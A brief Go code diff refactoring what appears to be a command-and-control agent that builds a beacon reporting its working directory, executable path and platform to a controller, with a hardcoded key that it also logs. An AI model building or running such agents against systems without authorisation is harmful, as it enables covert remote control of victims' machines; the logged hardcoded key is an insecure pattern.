@@ -12,13 +12,13 @@ import (
 
 var key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
 
-func buildBeacon(name string, group string, sleep int) sockets.Beacon {
+func buildBeacon(agent *util.AgentConfig) sockets.Beacon {
 	pwd, _ := os.Getwd()
 	executable, _ := os.Executable()
 	return sockets.Beacon{
-		Name:      name,
-		Range:     group,
-		Sleep:	   sleep,
+		Name:      agent.Name,
+		Range:     agent.Range,
+		Sleep:	   agent.Sleep,
 		Pwd:       pwd,
 		Location:  executable,
 		Platform:  runtime.GOOS,
@@ -51,5 +51,5 @@ func main() {
 	util.EncryptionKey = &agent.AESKey
 	sockets.UA = &agent.Useragent
 	log.Printf("[%s] agent at PID %d using key %s", agent.Address, os.Getpid(), key)
-	sockets.CommunicationChannels[agent.Contact].Communicate(agent, buildBeacon(agent.Name, agent.Range, agent.Sleep))
+	sockets.EventLoop(agent, buildBeacon(agent))
 }
